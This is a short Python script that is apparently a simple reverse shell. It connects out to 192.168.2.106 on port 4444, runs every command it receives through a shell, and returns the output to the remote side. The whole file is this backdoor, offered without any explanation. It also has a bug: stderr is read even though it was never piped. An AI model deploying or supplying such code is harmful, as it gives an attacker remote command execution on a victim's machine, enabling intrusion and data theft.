#!/usr/bin/python

import socket
import subprocess

sock =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.2.106", 4444))

while True:
	command = sock.recv(2048)
	if command == "q":
		break
	else:
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
		result = proc.stdout.read() + proc.stderr.read()
		sock.send(result)

sock.close()
